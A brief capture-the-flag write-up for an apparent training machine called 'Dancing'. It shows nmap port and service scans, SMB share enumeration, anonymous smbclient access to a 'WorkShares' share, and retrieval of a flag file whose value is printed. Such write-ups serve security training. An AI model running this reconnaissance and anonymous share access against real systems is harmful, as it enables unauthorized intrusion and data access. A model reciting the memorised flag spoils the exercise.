# Dancing

----
> TARGET MACHINE IP ADDRESS: 10.129.143.5
----

## Nmap
```
nmap -Pn -sS -sV -sC -O -T4 -p- 10.129.143.5
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-21 00:40 GMT
Nmap scan report for 10.129.143.5
Host is up (0.0090s latency).
Not shown: 63648 closed tcp ports (reset), 1876 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=2/21%OT=135%CT=1%CU=30992%PV=Y%DS=2%DC=I%G=Y%TM=65D546
OS:F5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS
OS:=U)SEQ(TI=I%TS=U)SEQ(SP=104%GCD=1%ISR=10E%TI=RD%CI=I%II=I%TS=U)OPS(O1=M5
OS:52NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS
OS:)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W
OS:=FFFF%O=M552NW8NNS%CC=Y%Q=)ECN(R=N)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q
OS:=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=80%W
OS:=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T5(R=N)T6(R=Y
OS:%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T6(R=N)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIP
OS:CK=G%RUCK=G%RUD=G)U1(R=N)IE(R=Y%DFI=N%T=80%CD=Z)IE(R=N)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3h59m59s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-21T04:42:24
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.48 seconds
```

## Enum Shares

### Nmap Gave Nothing
```
nmap -sV --script smb-enum-shares -p 445 10.129.143.5
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-21 00:45 GMT
Nmap scan report for 10.129.143.5
Host is up (0.0093s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.97 seconds
```

### smbclient -L
```
smbclient -L 10.129.143.5 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
SMB1 disabled -- no workgroup available
```

## Pwn
```
smbclient //10.129.143.5/WorkShares -N

> smb: \> ls
  .                                   D        0  Mon Mar 29 09:22:01 2021
  ..                                  D        0  Mon Mar 29 09:22:01 2021
  Amy.J                               D        0  Mon Mar 29 10:08:24 2021
  James.P                             D        0  Thu Jun  3 09:38:03 2021

> smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 09:38:03 2021
  ..                                  D        0  Thu Jun  3 09:38:03 2021
  flag.txt                            A       32  Mon Mar 29 10:26:57 2021

		5114111 blocks of size 4096. 1733541 blocks available

> smb: \James.P\> get flag.txt 

cat flag.txt 
5f61c10dffbc77a704d76016a22f1664
```
